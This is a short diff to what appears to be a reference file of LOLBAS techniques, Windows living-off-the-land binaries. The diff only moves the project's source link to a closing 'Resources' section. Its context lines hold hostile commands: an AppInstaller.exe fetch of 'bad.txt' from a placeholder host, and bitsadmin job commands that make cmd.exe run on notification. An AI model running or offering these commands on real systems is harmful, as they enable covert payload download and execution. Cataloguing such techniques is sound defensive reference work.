@@ -1,5 +1,3 @@
-# Source: https://lolbas-project.github.io/#
-
 # AppInstaller.exe T1105
 start ms-appinstaller://?source=https://127.0.0.1/bad.txt
 
@@ -45,3 +43,8 @@ C:\Windows\System32\bitsadmin.exe /SetNotifyCmdLine 1 c:\cmd.exe NULL
 C:\Windows\System32\bitsadmin.exe /RESUME 1
 C:\Windows\System32\bitsadmin.exe /Reset
 
+
+
+
+# Resources
+https://lolbas-project.github.io/#
